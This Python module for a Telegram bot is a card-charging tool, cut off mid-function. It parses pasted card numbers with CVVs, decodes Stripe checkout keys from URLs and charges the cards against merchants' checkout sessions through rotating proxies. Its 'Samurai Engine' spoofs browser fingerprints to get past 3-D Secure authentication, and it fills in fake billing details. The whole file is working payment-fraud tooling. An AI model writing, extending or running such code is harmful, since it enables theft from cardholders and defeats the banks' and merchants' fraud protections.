"""
Proxy management and Stripe charge commands (/addproxy, /removeproxy, /proxy, /co).

This module centralises:
  • Proxy storage (proxies.json)
  • Stripe checkout parsing and 3DS-bypass logic
  • Card charging with retry / bypass support
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import time
from typing import Optional

import aiohttp
from urllib.parse import quote, unquote

import base64

from aiogram import Router
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.enums import ParseMode

from config import (
    ALLOWED_GROUP,
    DEFAULT_HEADERS,
    OWNER_ID,
    PROXY_FILE,
    PROXY_CHECK_THREADS,
    SESSION_CONNECTOR_LIMIT,
    SESSION_TIMEOUT_CONNECT,
    SESSION_TIMEOUT_TOTAL,
)

logger = logging.getLogger(__name__)

router = Router()

# ═══════════════════════════════════════════════════════════════════════
#  Proxy storage helpers
# ═══════════════════════════════════════════════════════════════════════

def _load_proxies() -> dict:
    """Load the proxy JSON file, returning an empty dict on failure."""
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except (json.JSONDecodeError, OSError):
        logger.warning("Failed to load %s – starting fresh.", PROXY_FILE)
    return {}


def _save_proxies(data: dict) -> None:
    """Atomically write proxies to the JSON file."""
    try:
        with open(PROXY_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except OSError:
        logger.exception("Failed to persist proxies to %s.", PROXY_FILE)


def _get_user_proxies(user_id: int) -> list[str]:
    """Return the list of proxies owned by *user_id*."""
    proxies = _load_proxies()
    user_key = str(user_id)
    entry = proxies.get(user_key)
    if entry is None:
        return []
    if isinstance(entry, str):
        return [entry] if entry else []
    return entry if isinstance(entry, list) else []


def _add_user_proxy(user_id: int, proxy: str) -> None:
    """Append *proxy* to the user's proxy list (avoid duplicates)."""
    proxies = _load_proxies()
    user_key = str(user_id)
    current = proxies.get(user_key)

    if current is None:
        proxies[user_key] = [proxy]
    elif isinstance(current, str):
        proxies[user_key] = [current, proxy] if current != proxy else [current]
    elif isinstance(current, list):
        if proxy not in current:
            current.append(proxy)
    else:
        proxies[user_key] = [proxy]

    _save_proxies(proxies)


def _remove_user_proxy(user_id: int, proxy: Optional[str]) -> bool:
    """
    Remove a specific proxy or all proxies for the user.
    Returns *True* if something was removed.
    """
    proxies = _load_proxies()
    user_key = str(user_id)

    if user_key not in proxies:
        return False

    if proxy is None or proxy.lower() == "all":
        del proxies[user_key]
        _save_proxies(proxies)
        return True

    current = proxies[user_key]
    if isinstance(current, list):
        new_list = [p for p in current if p != proxy]
        if len(new_list) == len(current):
            return False
        if new_list:
            proxies[user_key] = new_list
        else:
            del proxies[user_key]
    elif isinstance(current, str) and current == proxy:
        del proxies[user_key]
    else:
        return False

    _save_proxies(proxies)
    return True


def _pick_random_proxy(user_id: int) -> Optional[str]:
    """Return a random proxy from the user's list, or *None*."""
    proxies = _get_user_proxies(user_id)
    return random.choice(proxies) if proxies else None


# ═══════════════════════════════════════════════════════════════════════
#  Proxy parsing utilities
# ═══════════════════════════════════════════════════════════════════════

def _parse_proxy_format(proxy_str: str) -> dict:
    """Parse a proxy string into components."""
    proxy_str = proxy_str.strip()
    result = {
        "user": None,
        "password": None,
        "host": None,
        "port": None,
        "raw": proxy_str,
    }

    try:
        if "@" in proxy_str:
            if proxy_str.count("@") == 1:
                auth_part, host_part = proxy_str.rsplit("@", 1)
                if ":" in auth_part:
                    result["user"], result["password"] = auth_part.split(":", 1)
                if ":" in host_part:
                    result["host"], port_str = host_part.rsplit(":", 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except (ValueError, IndexError):
        logger.debug("Failed to parse proxy string: %s", proxy_str)

    return result


def _build_proxy_url(proxy_str: str) -> Optional[str]:
    """Convert a proxy string into a http(s)://user:pass@host:port URL."""
    parsed = _parse_proxy_format(proxy_str)
    if not parsed["host"] or not parsed["port"]:
        return None
    if parsed["user"] and parsed["password"]:
        return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
    return f"http://{parsed['host']}:{parsed['port']}"


def _obfuscate_ip(ip: str) -> str:
    """Return a privacy‑friendly representation of an IP (e.g. 1XX.2XX.3XX.4XX)."""
    if not ip:
        return "N/A"
    parts = ip.split(".")
    if len(parts) == 4:
        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"


# ═══════════════════════════════════════════════════════════════════════
#  Stripe‑related helpers
# ═══════════════════════════════════════════════════════════════════════

def _get_currency_symbol(currency: str) -> str:
    """Map ISO currency code → symbol."""
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$",
    }
    return symbols.get(currency.upper(), "")


def _check_access(msg: Message) -> bool:
    """Return *True* if the user/chat is allowed."""
    if msg.from_user and msg.from_user.id == OWNER_ID:
        return True
    if msg.chat.id == ALLOWED_GROUP:
        return True
    return False


# ═══════════════════════════════════════════════════════════════════════
#  Stripe checkout URL extraction & decoding
# ═══════════════════════════════════════════════════════════════════════

_STRIPE_URL_PATTERNS = [
    re.compile(r"https?://checkout\.stripe\.com/c/pay/cs_[A-Za-z0-9_\-]+#[^%]*%%%?", re.IGNORECASE),
    re.compile(r"https?://checkout\.stripe\.com/c/pay/cs_[A-Za-z0-9_\-]+#[A-Za-z0-9%\-_=]+", re.IGNORECASE),
    re.compile(r"https?://checkout\.stripe\.com/c/pay/cs_[A-Za-z0-9_\-]+", re.IGNORECASE),
    re.compile(r"https?://checkout\.stripe\.com/[^\s]+", re.IGNORECASE),
    re.compile(r"https?://buy\.stripe\.com/[^\s]+", re.IGNORECASE),
]


def _extract_checkout_url(text: str) -> Optional[str]:
    """Find the first Stripe checkout URL in *text*."""
    for pattern in _STRIPE_URL_PATTERNS:
        m = pattern.search(text)
        if m:
            url = m.group(0)

            # Trim trailing "yes/no/y n" garbage
            for delim in ("yes", "no", "y ", "n "):
                if delim in url.lower():
                    idx = url.lower().index(delim)
                    if "#" in url:
                        hash_start = url.index("#")
                        if idx > hash_start + 10:
                            url = url[:idx]
                            break

            # Strip any trailing card details
            card_match = re.search(r"\d{13,19}\|", url)
            if card_match:
                url = url[: card_match.start()]

            return url.rstrip(".,;:")
    return None


def _decode_pk_from_url(url: str) -> dict:
    """Decode pk/cs from the URL hash fragment."""
    result = {"pk": None, "cs": None, "site": None}

    try:
        cs_match = re.search(r"cs_(live|test)_[A-Za-z0-9]+", url)
        if cs_match:
            result["cs"] = cs_match.group(0)

        if "#" not in url:
            return result

        hash_part = url.split("#", 1)[1]
        hash_decoded = unquote(hash_part)

        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = "".join(chr(b ^ 5) for b in decoded_bytes)

            pk_match = re.search(r"pk_(live|test)_[A-Za-z0-9]+", xored)
            if pk_match:
                result["pk"] = pk_match.group(0)

            site_match = re.search(r"https?://[^\s\"\'\<\>]+", xored)
            if site_match:
                result["site"] = site_match.group(0)
        except Exception:
            logger.debug("Failed to XOR‑decode URL hash.")
    except Exception:
        logger.exception("Unexpected error decoding URL.")

    return result


# ═══════════════════════════════════════════════════════════════════════
#  Card parsing
# ═══════════════════════════════════════════════════════════════════════

_CARD_PATTERN = re.compile(
    r"(\d{15,19})\s*[|:/\\\-\s]+\s*(\d{1,2})\s*[|:/\\\-\s]+\s*(\d{2,4})\s*[|:/\\\-\s]+\s*(\d{3,4})"
)


def _parse_card(text: str) -> Optional[dict]:
    """Convert a raw card string → {cc, month, year, cvv}."""
    text = text.strip()
    if not text:
        return None

    m = _CARD_PATTERN.search(text)
    if m:
        cc, month, year, cvv = m.groups()
    else:
        parts = re.split(r"[|:/\\\-\s]+", text)
        if len(parts) < 4:
            return None
        cc = re.sub(r"\D", "", parts[0])
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = re.sub(r"\D", "", parts[3])

    # Validate & normalise
    cc = re.sub(r"\D", "", cc)
    if not (15 <= len(cc) <= 19):
        return None

    month = month.zfill(2)
    if not (month.isdigit() and 1 <= int(month) <= 12):
        return None

    if len(year) == 4:
        year = year[2:]
    if len(year) != 2 or not year.isdigit():
        return None

    cvv = re.sub(r"\D", "", cvv)
    if not (3 <= len(cvv) <= 4):
        return None

    return {"cc": cc, "month": month, "year": year, "cvv": cvv}


def _parse_cards(text: str) -> list[dict]:
    """Extract all valid cards from *text* (one per line, or mixed)."""
    cards = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to find multiple cards per line
        for m in _CARD_PATTERN.finditer(line):
            card = _parse_card("|".join(m.groups()))
            if card:
                cards.append(card)

        if not _CARD_PATTERN.search(line):
            card = _parse_card(line)
            if card:
                cards.append(card)
    return cards


# ═══════════════════════════════════════════════════════════════════════
#  aiohttp session management (co‑module)
# ═══════════════════════════════════════════════════════════════════════

_co_session: Optional[aiohttp.ClientSession] = None


async def _get_co_session() -> aiohttp.ClientSession:
    """Lazily create a shared session for the /co command."""
    global _co_session
    if _co_session is None or _co_session.closed:
        _co_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=SESSION_CONNECTOR_LIMIT, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=SESSION_TIMEOUT_TOTAL, connect=SESSION_TIMEOUT_CONNECT),
        )
        logger.debug("Created new aiohttp session (commands.co).")
    return _co_session


async def close_session() -> None:
    """Close the module‑level aiohttp session."""
    global _co_session
    if _co_session and not _co_session.closed:
        await _co_session.close()
        logger.debug("Closed aiohttp session (commands.co).")
    _co_session = None


# ═══════════════════════════════════════════════════════════════════════
#  Stripe API helpers
# ═══════════════════════════════════════════════════════════════════════

async def _get_checkout_info(url: str) -> dict:
    """Fetch checkout metadata (merchant, price, currency, …)."""
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "support_email": None,
        "support_phone": None,
        "cards_accepted": None,
        "success_url": None,
        "cancel_url": None,
        "init_data": None,
        "error": None,
        "time": 0,
    }

    try:
        decoded = _decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")

        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        session = await _get_co_session()
        body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"

        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
            headers=DEFAULT_HEADERS,
            data=body,
        ) as resp:
            init_data = await resp.json()

        if "error" in init_data:
            result["error"] = init_data.get("error", {}).get("message", "Init failed")
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        result["init_data"] = init_data

        # Extract fields
        acc = init_data.get("account_settings", {})
        result["merchant"] = acc.get("display_name") or acc.get("business_name")
        result["support_email"] = acc.get("support_email")
        result["support_phone"] = acc.get("support_phone")
        result["country"] = acc.get("country")

        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            result["price"] = lig.get("total", 0) / 100
            result["currency"] = lig.get("currency", "").upper()
            if lig.get("line_items"):
                items = lig["line_items"]
                currency = lig.get("currency", "").upper()
                sym = _get_currency_symbol(currency)
                product_parts = []
                for item in items:
                    qty = item.get("quantity", 1)
                    name = item.get("name", "Product")
                    amt = item.get("amount", 0) / 100
                    interval = item.get("recurring_interval")
                    if interval:
                        product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                    else:
                        product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                result["product"] = ", ".join(product_parts)
        elif inv:
            result["price"] = inv.get("total", 0) / 100
            result["currency"] = inv.get("currency", "").upper()

        mode = init_data.get("mode", "")
        if mode:
            result["mode"] = mode.upper()
        elif init_data.get("subscription"):
            result["mode"] = "SUBSCRIPTION"
        else:
            result["mode"] = "PAYMENT"

        cust = init_data.get("customer") or {}
        result["customer_name"] = cust.get("name")
        result["customer_email"] = init_data.get("customer_email") or cust.get("email")

        pm_types = init_data.get("payment_method_types") or []
        if pm_types:
            cards = [t.upper() for t in pm_types if t != "card"]
            if "card" in pm_types:
                cards.insert(0, "CARD")
            result["cards_accepted"] = ", ".join(cards) if cards else "CARD"

        result["success_url"] = init_data.get("success_url")
        result["cancel_url"] = init_data.get("cancel_url")

    except aiohttp.ClientError as exc:
        logger.warning("HTTP error fetching checkout info: %s", exc)
        result["error"] = f"HTTP error: {exc}"
    except Exception as exc:
        logger.exception("Unexpected error in get_checkout_info.")
        result["error"] = str(exc)

    result["time"] = round(time.perf_counter() - start, 2)
    return result


async def _check_checkout_active(pk: str, cs: str) -> bool:
    """Return *True* if the checkout is still active."""
    try:
        session = await _get_co_session()
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/init",
            headers=DEFAULT_HEADERS,
            data=body,
            timeout=aiohttp.ClientTimeout(total=5),
        ) as resp:
            data = await resp.json()
            return "error" not in data
    except Exception:
        logger.debug("checkout active check failed.")
        return False


# ═══════════════════════════════════════════════════════════════════════
#  3DS Bypass engine
# ═══════════════════════════════════════════════════════════════════════

_BYPASS_PROFILES = [
    {  # Chrome Win
        "fingerprintAttempted": True,
        "fingerprintData": None,
        "challengeWindowSize": None,
        "threeDSCompInd": "Y",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserColorDepth": "24",
        "browserScreenHeight": "1080",
        "browserScreenWidth": "1920",
        "browserTZ": "-300",
        "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    },
    {  # Chrome Mac
        "fingerprintAttempted": True,
        "fingerprintData": None,
        "challengeWindowSize": None,
        "threeDSCompInd": "Y",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserColorDepth": "30",
        "browserScreenHeight": "900",
        "browserScreenWidth": "1440",
        "browserTZ": "-480",
        "browserUserAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    },
    {  # Safari Mac
        "fingerprintAttempted": True,
        "fingerprintData": None,
        "challengeWindowSize": None,
        "threeDSCompInd": "Y",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-US",
        "browserColorDepth": "30",
        "browserScreenHeight": "900",
        "browserScreenWidth": "1440",
        "browserTZ": "-420",
        "browserUserAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    },
]


async def _handle_3ds_challenge(
    session: aiohttp.ClientSession,
    source: str,
    pk: str,
    proxy_url: Optional[str] = None,
    **_,
) -> dict:
    """Attempt to bypass 3DS using multiple strategies."""
    logger.debug("🔐 Handling 3DS challenge (Samurai Engine) ...")
    last_state = None

    # Strategy 1 — Profile rotation
    if source:
        logger.debug("=== STRATEGY 1: 3DS2 Authenticate (frictionless) ===")
        for profile_idx, profile in enumerate(_BYPASS_PROFILES):
            logger.debug("Trying bypass profile %d/%d ...", profile_idx + 1, len(_BYPASS_PROFILES))

            browser_data = profile.copy()
            browser_json = json.dumps(browser_data)

            auth_body = f"source={source}&browser={quote(browser_json)}"
            auth_body += "&one_click_authn_device_support[hosted]=false"
            auth_body += "&one_click_authn_device_support[same_origin_frame]=false"
            auth_body += "&one_click_authn_device_support[spc_eligible]=true"
            auth_body += "&one_click_authn_device_support[webauthn_eligible]=true"
            auth_body += "&one_click_authn_device_support[publickey_credentials_get_allowed]=true"
            auth_body += f"&key={pk}"

            try:
                async with session.post(
                    "https://api.stripe.com/v1/3ds2/authenticate",
                    headers=DEFAULT_HEADERS,
                    data=auth_body,
                    proxy=proxy_url,
                ) as r:
                    auth_result = await r.json()

                logger.debug("3DS Auth Response keys: %s", list(auth_result.keys()))

                if "error" in auth_result and auth_result.get("error") is not None:
                    error_obj = auth_result.get("error")
                    error_msg = error_obj.get("message", "Auth failed") if isinstance(error_obj, dict) else str(error_obj)
                    logger.debug("❌ 3DS Auth Error: %s", error_msg)
                    break

                state = auth_result.get("state", "")
                last_state = state
                ares = auth_result.get("ares")

                if state == "succeeded":
                    logger.debug("✅ 3DS BYPASSED (state=succeeded)")
                    return {"success": True, "bypassed": True}

                if ares and isinstance(ares, dict):
                    trans_status = ares.get("transStatus", "")
                    acs_challenge = ares.get("acsChallengeMandated", "")
                    logger.debug("3DS TransStatus: %s, Challenge: %s", trans_status, acs_challenge)

                    if trans_status == "Y":
                        logger.debug("✅ 3DS BYPASSED with profile %d!", profile_idx + 1)
                        return {"success": True, "bypassed": True}
                    if trans_status in ("A", "I"):
                        logger.debug("✅ 3DS passed (transStatus=%s)", trans_status)
                        return {"success": True, "bypassed": True}
                    if trans_status in ("N", "R"):
                        logger.debug("❌ 3DS rejected by bank (transStatus=%s)", trans_status)
                        return {"success": False, "error": f"Bank rejected 3DS (status={trans_status})"}
                    if trans_status == "C" or acs_challenge == "Y" or state == "challenge_required":
                        if profile_idx < len(_BYPASS_PROFILES) - 1:
                            await asyncio.sleep(0.3)
                            continue
                        break
            except Exception as e:
                logger.debug("❌ 3DS Auth Exception: %s", str(e)[:80])
                if profile_idx < len(_BYPASS_PROFILES) - 1:
                    continue
                break

    # Strategy 2 — CompInd=U fallback
    if source:
        logger.debug("=== STRATEGY 2: 3DS2 Authenticate (CompInd=U) ===")
        browser_unavailable = {
            "fingerprintAttempted": False,
            "fingerprintData": None,
            "challengeWindowSize": None,
            "threeDSCompInd": "U",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1080",
            "browserScreenWidth": "1920",
            "browserTZ": "-300",
            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }

        auth_body = f"source={source}&browser={quote(json.dumps(browser_unavailable))}"
        auth_body += "&one_click_authn_device_support[hosted]=false"
        auth_body += "&one_click_authn_device_support[same_origin_frame]=false"
        auth_body += "&one_click_authn_device_support[spc_eligible]=false"
        auth_body += "&one_click_authn_device_support[webauthn_eligible]=false"
        auth_body += "&one_click_authn_device_support[publickey_credentials_get_allowed]=false"
        auth_body += f"&key={pk}"

        try:
            async with session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                headers=DEFAULT_HEADERS,
                data=auth_body,
                proxy=proxy_url,
            ) as r:
                auth_result = await r.json()

            if "error" not in auth_result or auth_result.get("error") is None:
                state = auth_result.get("state", "")
                ares = auth_result.get("ares")
                logger.debug("Strategy 2 state: %s", state)

                if state == "succeeded":
                    logger.debug("✅ 3DS BYPASSED via CompInd=U!")
                    return {"success": True, "bypassed": True}

                if ares and isinstance(ares, dict):
                    trans_status = ares.get("transStatus", "")
                    if trans_status in ("Y", "A", "I"):
                        logger.debug("✅ 3DS passed via CompInd=U (transStatus=%s)", trans_status)
                        return {"success": True, "bypassed": True}
                    logger.debug("Strategy 2 transStatus: %s", trans_status)
        except Exception as e:
            logger.debug("❌ Strategy 2 error: %s", str(e)[:80])

    # Strategy 3 — Minimal auth
    if source:
        logger.debug("=== STRATEGY 3: 3DS2 Authenticate (minimal) ===")
        auth_body = f"source={source}&key={pk}"

        try:
            async with session.post(
                "https://api.stripe.com/v1/3ds2/authenticate",
                headers=DEFAULT_HEADERS,
                data=auth_body,
                proxy=proxy_url,
            ) as r:
                auth_result = await r.json()

            if "error" not in auth_result or auth_result.get("error") is None:
                state = auth_result.get("state", "")
                logger.debug("Strategy 3 state: %s", state)

                if state == "succeeded":
                    logger.debug("✅ 3DS BYPASSED via minimal auth!")
                    return {"success": True, "bypassed": True}

                ares = auth_result.get("ares")
                if ares and isinstance(ares, dict):
                    trans_status = ares.get("transStatus", "")
                    if trans_status in ("Y", "A", "I"):
                        logger.debug("✅ 3DS passed via minimal (transStatus=%s)", trans_status)
                        return {"success": True, "bypassed": True}
                    logger.debug("Strategy 3 transStatus: %s", trans_status)
        except Exception as e:
            logger.debug("❌ Strategy 3 error: %s", str(e)[:80])

    return {"success": False, "error": "All bypass strategies exhausted", "last_state": last_state}


# ═══════════════════════════════════════════════════════════════════════
#  Core charging logic
# ═══════════════════════════════════════════════════════════════════════

async def _charge_card(
    card: dict,
    checkout_data: dict,
    proxy_str: Optional[str] = None,
    bypass_3ds: bool = False,
    max_retries: int = 2,
) -> dict:
    """Charge a single card against a checkout."""
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "bypass_attempted": False,
        "bypass_success": False,
    }

    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    logger.debug("Card: %s", card_display)

    for attempt in range(max_retries + 1):
        try:
            proxy_url = _build_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)

                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"

                pm_body = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                    f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
                    f"&billing_details[name]={name}&billing_details[email]={email}"
                    f"&billing_details[address][country]={country}"
                    f"&billing_details[address][line1]={line1}"
                    f"&billing_details[address][city]={city}"
                    f"&billing_details[address][postal_code]={zip_code}"
                    f"&billing_details[address][state]={state}&key={pk}"
                )

                if attempt > 0:
                    logger.debug("Retry attempt %d ...", attempt)
                logger.debug("Creating payment method ...")

                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=DEFAULT_HEADERS,
                    data=pm_body,
                    proxy=proxy_url,
                ) as r:
                    pm = await r.json()

                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    logger.debug("PM Error: %s", err_msg[:60])
                    if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                        result["status"] = "NOT SUPPORTED"
                        result["response"] = "Checkout not supported"
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    logger.debug("Final: %s - %s (%ss)", result["status"], result["response"], result["time"])
                    return result

                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result

                logger.debug("PM Response: %s", pm_id)
                logger.debug("Confirming payment ... (bypass_3ds=%s)", bypass_3ds)

                conf_body = (
                    f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                )

                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"

                async with session.post(
                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                    headers=DEFAULT_HEADERS,
                    data=conf_body,
                    proxy=proxy_url,
                ) as r:
                    conf = await r.json()

                logger.debug("Confirm Response: %s ...", str(conf)[:200])

                if "error" in conf:
                    err = conf["error"]
                    err_msg = err.get("message", "Failed")
                    err_code = err.get("code", "")
                    dc = err.get("decline_code", "")

                    if "canceled" in err_msg.lower() or "cancelled" in err_msg.lower():
                        logger.debug("⚠️ Payment Intent canceled – checkout may be expired")
                        result["status"] = "FAILED"
                        result["response"] = "Checkout expired or canceled"
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = f"{dc.upper()}: {err_msg}" if dc else err_msg[:150]

                    logger.debug("Error: %s - %s - %s", err_code, dc, err_msg)
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    next_action = pi.get("next_action", {})

                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action" and next_action:
                        logger.debug("🔐 3DS Challenge Detected!")
                        logger.debug("🚀 Attempting 3DS Bypass (Samurai Engine) ...")
                        result["bypass_attempted"] = True

                        use_stripe_sdk = next_action.get("use_stripe_sdk", {})
                        three_ds_source = use_stripe_sdk.get("three_d_secure_2_source") or use_stripe_sdk.get("source")

                        if not three_ds_source:
                            redirect_url = next_action.get("redirect_to_url", {}).get("url", "")
                            if "source=" in redirect_url:
                                three_ds_source = redirect_url.split("source=")[-1].split("&")[0]

                        if not three_ds_source:
                            three_ds_source = ""

                        bypass_result = await _handle_3ds_challenge(
                            session, three_ds_source, pk, proxy_url,
                            pi_id=pi.get('id'),
                            pi_secret=pi.get('client_secret'),
                            pm_id=pm_id,
                        )

                        if bypass_result.get("success"):
                            result["bypass_success"] = True

                            if bypass_result.get("declined"):
                                dc = bypass_result.get("decline_code", "")
                                bmsg = bypass_result.get("message", "Declined")
                                result["status"] = "DECLINED"
                                result["response"] = f"3DS Bypassed ✅ - {dc.upper()}: {bmsg}" if dc else f"3DS Bypassed ✅ - {bmsg}"
                            else:
                                logger.debug("✅ 3DS BYPASSED! Checking payment status ...")
                                await asyncio.sleep(0.5)

                                async with session.get(
                                    f"https://api.stripe.com/v1/payment_intents/{pi.get('id')}",
                                    params={"key": pk, "client_secret": pi.get("client_secret")},
                                    headers=DEFAULT_HEADERS,
                                    proxy=proxy_url,
                                ) as r:
                                    pi_check = await r.json()

                                final_status = pi_check.get("status", "")
                                last_error = pi_check.get("last_payment_error")

                                logger.debug("Final Status: %s", final_status)

                                if final_status == "succeeded":
                                    result["status"] = "CHARGED"
                                    result["response"] = "3DS Bypassed ✅ - Payment Successful"
                                elif final_status == "requires_capture":
                                    result["status"] = "CHARGED"
                                    result["response"] = "3DS Bypassed ✅ - Payment Authorized"
                                elif last_error:
                                    dc = last_error.get("decline_code", "")
                                    emsg = last_error.get("message", "Declined")
                                    result["status"] = "DECLINED"
                                    result["response"] = f"3DS Bypassed ✅ - {dc.upper()}: {emsg}" if dc else f"3DS Bypassed ✅ - {emsg}"
                                elif final_status == "requires_payment_method":
                                    result["status"] = "DECLINED"
                                    result["response"] = "3DS Bypassed ✅ - Card Declined"
                                elif final_status == "requires_action":
                                    result["status"] = "3DS FAIL"
                                    result["response"] = "Bypass Failed: Bank enforces 3DS"
                                else:
                                    result["status"] = "3DS BYPASS"
                                    result["response"] = f"3DS Bypassed ✅ - Status: {final_status}"
                        else:
                            error_msg = bypass_result.get("error", "Unknown")[:80]
                            result["status"] = "3DS FAIL"
                            result["response"] = f"Bypass Failed: {error_msg}"
                            logger.debug("❌ Bypass Failed: %s", error_msg)
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"

                result["time"] = round(time.perf_counter() - start, 2)
                logger.debug("Final: %s - %s (%ss)", result["status"], result["response"], result["time"])
                return result

        except aiohttp.ClientError as exc:
            err_str = str(exc)
            logger.debug("❌ ClientError: %s", err_str[:50])
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                logger.debug("Retrying in 1s ...")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            logger.debug("Final: %s - %s (%ss)", result["status"], result["response"], result["time"])
            return result

        except Exception as exc:
            err_str = str(exc)
            logger.debug("❌ Error: %s", err_str[:50])
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                logger.debug("Retrying in 1s ...")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
